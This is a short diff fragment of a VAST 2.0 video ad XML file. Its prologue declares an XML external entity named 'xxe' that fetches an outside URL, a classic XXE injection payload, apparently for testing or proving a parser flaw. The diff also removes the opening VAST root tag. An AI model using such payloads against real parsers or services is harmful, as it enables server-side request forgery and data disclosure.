@@ -2,7 +2,6 @@
 <!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
 <!ENTITY xxe SYSTEM "https://jira.ouroath.com">]>
-<VAST version="2.0">
 <Ad id="preroll-1">
 <InLine>
 <AdSystem>2.0</AdSystem>
